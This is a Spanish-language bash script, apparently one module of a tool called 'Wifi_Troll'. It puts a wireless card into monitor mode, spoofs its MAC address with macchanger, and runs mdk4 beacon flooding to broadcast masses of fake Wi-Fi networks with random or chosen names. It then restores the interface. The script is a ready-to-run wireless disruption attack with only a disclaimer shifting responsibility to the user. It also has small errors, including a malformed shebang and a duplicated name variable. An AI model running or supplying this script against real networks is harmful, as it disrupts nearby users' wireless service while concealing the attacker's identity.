#!bin/bash

clear
echo
echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
echo "                           \/                   /_____/                                       "
echo "                                               ¯\_(ツ)_/¯"
echo "                              __________________________________________________"					
echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
echo "          -------------------------------------------------------------------------------------------"
echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
echo "          -------------------------------------------------------------------------------------------"
echo
echo
echo "[2] Crear Redes Wifi masivas"
echo
echo "=========================="
echo "[1] Nombres Random"
echo "[2] Nombres Personalizados"
echo "=========================="
echo
read -p "Elige una opcion: " opc1
	case $opc1 in
			1 )	echo
				read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
				read -p "[*] Cortar la salida a internet para evitar futuros errores? (y/n): " opc2
				echo
				if [ $opc2 = y ]
					then
						sudo airmon-ng check kill >/dev/null
					else
				echo "OK"
				fi
				sudo ifconfig $interfaz promisc >/dev/null
				sudo airmon-ng start $interfaz >/dev/null
				echo "======================="
				echo "Activando Modo Monitor"
				echo "======================="
				echo "--->""                  |"
				sleep 1
				echo "-------->""             |"
				sleep 1
				echo "--------------->""      |"
				sleep 1
				echo "--------------------->""|"
				echo "======================="
				sudo airmon-ng 
				echo
				read -p "[*] Escribe la Interfaz de la Tarjeta de Red en modo Monitor (Ej: wlan0mon o wlan0): " interfaz2
				echo
				sudo ifconfig $interfaz2 promisc >/dev/null
				sudo ifconfig $interfaz2 down >/dev/null
				sudo macchanger -a $interfaz2 >/dev/null
				sudo ifconfig $interfaz2 up >/dev/null
				echo "======================="
				echo " Activando Modo Seguro"
				echo "======================="
				echo "--->""                  |"
				sleep 1
				echo "-------->""             |"
				sleep 1
				echo "--------------->""      |"
				sleep 1
				echo "--------------------->""|"
				echo "======================="
				clear
				echo
				echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
				echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
				echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
				echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
				echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
				echo "                           \/                   /_____/                                       "
				echo "                                               ¯\_(ツ)_/¯"
				echo "                              __________________________________________________"					
				echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
				echo "          -------------------------------------------------------------------------------------------"
				echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
				echo "          -------------------------------------------------------------------------------------------"
				echo
				echo
				echo "[#] Pulse Ctrl + c (Para detener las Redes Wifi creadas)"
				echo
				sudo mdk4 $interfaz2 b -s 1000
				;;
			2 )     echo
				read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
				read -p "[*] Cortar la salida a internet para evitar futuros errores? (y/n): " opc2
				echo
				if [ $opc2 = y ]
					then
						sudo airmon-ng check kill >/dev/null
					else
				echo "OK"
				fi
				sudo ifconfig $interfaz promisc >/dev/null
				sudo airmon-ng start $interfaz >/dev/null
				echo "======================="
				echo "Activando Modo Monitor"
				echo "======================="
				echo "--->""                  |"
				sleep 1
				echo "-------->""             |"
				sleep 1
				echo "--------------->""      |"
				sleep 1
				echo "--------------------->""|"
				echo "======================="
				sudo airmon-ng 
				echo
				read -p "[*] Escribe la Interfaz de la Tarjeta de Red en modo Monitor (Ej: wlan0mon o wlan0): " interfaz2
				echo
				sudo ifconfig $interfaz2 promisc >/dev/null
				sudo ifconfig $interfaz2 down >/dev/null
				sudo macchanger -a $interfaz2 >/dev/null
				sudo ifconfig $interfaz2 up >/dev/null
				echo "======================="
				echo " Activando Modo Seguro"
				echo "======================="
				echo "--->""                  |"
				sleep 1
				echo "-------->""             |"
				sleep 1
				echo "--------------->""      |"
				sleep 1
				echo "--------------------->""|"
				echo "======================="
				clear
				echo
				echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
				echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
				echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
				echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
				echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
				echo "                           \/                   /_____/                                       "
				echo "                                               ¯\_(ツ)_/¯"
				echo "                              __________________________________________________"					
				echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
				echo "          -------------------------------------------------------------------------------------------"
				echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
				echo "          -------------------------------------------------------------------------------------------"
				echo
				echo
				echo "[#] Modo Personalizacion"
				echo
				read -p "[*] Usar el mismo nombre para todas las Redes Wifi? (y/n): " opc2
				echo
				if [ $opc2 = y ]
					then
						echo "[#] Se crearan hasta 102 Redes Wifi"
						echo
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name
cat > requisitos/lista1.lst << eof
$name(0)
$name(1)
$name(2)
$name(3)
$name(4)
$name(5)
$name(6)
$name(7)
$name(8)
$name(9)
$name(10)
$name(11)
$name(12)
$name(13)
$name(14)
$name(15)
$name(16)
$name(17)
$name(18)
$name(19)
$name(20)
$name(21)
$name(22)
$name(23)
$name(24)
$name(25)
$name(26)
$name(27)
$name(28)
$name(29)
$name(30)
$name(31)
$name(32)
$name(33)
$name(34)
eof
						clear
						echo
						echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
						echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
						echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
						echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
						echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
						echo "                           \/                   /_____/                                       "
						echo "                                               ¯\_(ツ)_/¯"
						echo "                              __________________________________________________"					
						echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
						echo "          -------------------------------------------------------------------------------------------"
						echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
						echo "          -------------------------------------------------------------------------------------------"
						echo
						echo
						echo "[#] Pulse Ctrl + c (Para detener las Redes Wifi creadas)"
						echo
						sudo mdk4 $interfaz2 b -s 1000 -f requisitos/lista1.lst
					else
						echo "[#] Puedes poner hasta 10 Nombres y se crearan hasta 30 Redes Wifi"
						echo
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name0
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name1
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name2
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name3
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name4
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name5
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name6
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name7
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name8
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name9
						read -p "[*] Escriba el nombre que quiere que tengan las Redes Wifi: " name10
cat > requisitos/lista2.lst << eof
$name0
$name1
$name2
$name3
$name3
$name4
$name5
$name6
$name7
$name8
$name9
$name10
eof
						clear
						echo
						echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
						echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
						echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
						echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
						echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
						echo "                           \/                   /_____/                                       "
						echo "                                               ¯\_(ツ)_/¯"
						echo "                              __________________________________________________"					
						echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
						echo "          -------------------------------------------------------------------------------------------"
						echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
						echo "          -------------------------------------------------------------------------------------------"
						echo
						echo
						echo "[#] Pulse Ctrl + c (Para detener las Redes Wifi creadas)"
						echo
						sudo mdk4 $interfaz2 b -s 1000 -f requisitos/lista2.lst
				fi
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
				bash requisitos/2.sh
	esac
clear
echo
echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
echo "                           \/                   /_____/                                       "
echo "                                               ¯\_(ツ)_/¯"
echo "                              __________________________________________________"					
echo "                                ︻デ═一  Created by: XDeadHackerX v1.2  ︻デ═一 " 
echo "          -------------------------------------------------------------------------------------------"
echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
echo "          -------------------------------------------------------------------------------------------"
echo
echo
echo "[#] Desactivando Ataque y Protocolos"
echo
sudo ifconfig $interfaz2 down >/dev/null
sudo macchanger -p $interfaz2 >/dev/null
sudo ifconfig $interfaz2 up >/dev/null
sudo ifconfig $interfaz2 -promisc >/dev/null
sudo airmon-ng stop $interfaz2 >/dev/null
sudo ifconfig $interfaz -promisc >/dev/null
sudo systemctl restart NetworkManager.service >/dev/null
echo "=============================="
echo "        Desactivando"
echo "Ataque/Modo Monitor/Seguridad"
echo "=============================="
echo "-------->""                    |"
sleep 1
echo "--------------->""             |"
sleep 1
echo "---------------------->""      |"
sleep 1
echo "---------------------------->""|"
echo "=============================="
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc4
	case $opc4 in
			1 )	bash wifi_troll.sh
				;;
			2 )	bash requisitos/2.sh
				;;
			3 )	exit && clear
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
